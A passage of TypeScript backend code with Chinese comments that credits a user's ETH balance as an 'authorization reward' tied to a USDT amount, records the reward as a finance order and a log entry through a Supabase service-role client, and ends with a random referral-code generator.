    const currentEth = parseFloat(currentUser.eth || '0')
    const currentAeth = parseFloat(currentUser.a_eth || '0')
    const newEthBalance = currentEth + ethReward
    const newAethBalance = currentAeth + ethReward
    
    // 更新用户ETH余额（使用新表结构）
    const { error: updateError } = await supabase
      .from('nh_member_new')
      .update({
        eth: newEthBalance.toString(),
        a_eth: newAethBalance.toString(),
        updated_at: new Date().toISOString()
      })
      .eq('id', userId)
    
    if (updateError) {
      throw new Error(`更新用户ETH余额失败: ${updateError.message}`)
    }
    
    // 记录奖励交易 - 使用withdraw类型但添加特殊备注
    // 使用服务角色密钥绕过RLS策略
    const supabaseAdmin = createClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL!,
      process.env.SUPABASE_SERVICE_ROLE_KEY!
    )
    
    // 为finance_orders表生成数字ID（从UUID生成一个稳定的数字ID）
    const numericUserId = typeof userId === 'string' ? 
      Math.abs(userId.split('').reduce((a, b) => { a = ((a << 5) - a) + b.charCodeAt(0); return a & a; }, 0)) % 1000000 : 
      userId
    
    const { error: rewardTxError } = await supabaseAdmin
      .from('finance_orders')
      .insert({
        user_id: numericUserId,
        user_uuid: userId, // 添加UUID字段
        order_no: `REWARD_${Date.now()}`,
        method_id: 2, // 奖励方法ID
        type: 'withdraw', // 使用withdraw类型（表约束要求）
        amount: ethReward.toString(),
        actual_amount: ethReward.toString(),
        fee: 0,
        wallet_address: wallet_address,
        status: 1, // 已完成
        create_time: Math.floor(Date.now() / 1000),
        remark: `[ETH奖励] 授权奖励 - 授权额度: ${authAmount} USDT, 奖励: ${ethReward} ETH`
      })
    
    if (rewardTxError) {
      console.error('⚠️ 记录奖励交易失败:', rewardTxError)
    } else {
      console.log('✅ 奖励交易记录成功')
    }
    
    // 记录ETH奖励日志到nh_logs表
    const { error: logError } = await supabaseAdmin
      .from('nh_logs')
      .insert({
        user_id: numericUserId,
        user_uuid: userId,
        action: 'eth_reward',
        description: `授权奖励 - 授权额度: ${authAmount} USDT, 奖励: ${ethReward} ETH`,
        created_at: new Date().toISOString()
      })
    
    if (logError) {
      console.error('⚠️ 记录ETH奖励日志失败:', logError)
    } else {
      console.log('✅ ETH奖励日志记录成功')
    }
    
    console.log(`🎉 授权奖励发放成功: 用户${userId}`)
    console.log(`   - 原ETH余额: ${currentEth} ETH`)
    console.log(`   - 奖励金额: ${ethReward} ETH`)
    console.log(`   - 新ETH余额: ${newEthBalance} ETH`)
    
  } catch (error) {
    console.error('❌ 赠送授权奖励失败:', error)
    throw error
  }
}

// 生成推荐码
function generateReferralCode(): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
  let result = ''
  for (let i = 0; i < 8; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length))
  }
  return result
}